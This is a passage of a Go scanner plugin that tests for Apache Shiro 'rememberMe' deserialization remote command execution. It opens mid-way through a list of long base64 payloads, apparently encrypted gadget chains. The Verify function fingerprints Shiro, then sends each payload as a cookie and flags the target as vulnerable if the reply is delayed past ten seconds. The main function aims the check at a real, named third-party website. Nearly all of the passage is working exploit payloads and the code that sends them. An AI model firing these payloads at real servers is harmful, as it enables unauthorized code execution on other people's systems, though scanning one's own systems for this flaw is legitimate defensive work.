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",
	}
)

func Verify(params engine.Params) (result engine.Result) {
	resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		Hosts:              params.Hosts,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		Cookies: map[string]string{
			"rememberMe": "jdscanner",
		},
	})
	if err != nil {
		return
	}
	resp.Close()

	if resp.HasCookieAndValue("rememberMe", "deleteMe") {
		for _, payload := range payloads {
			start := time.Now()
			resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
				DialTimeout:        time.Second * 5,
				RequestTimeout:     time.Second * 15,
				Hosts:              params.Hosts,
				InsecureSkipVerify: true,
				DisableRedirect:    true,
				Cookies: map[string]string{
					"rememberMe": payload,
				},
			})
			if err != nil {
				continue
			}
			resp.Close()
			if time.Now().Sub(start).Seconds() > 10 {
				result.Vul = true
				result.VulUrl = params.ParsedTarget.String()
				result.RawReq = resp.RawRequest()
				result.VulInfo = "shiro远程命令执行"
				return
			}
		}
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://voice.jd.com/"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
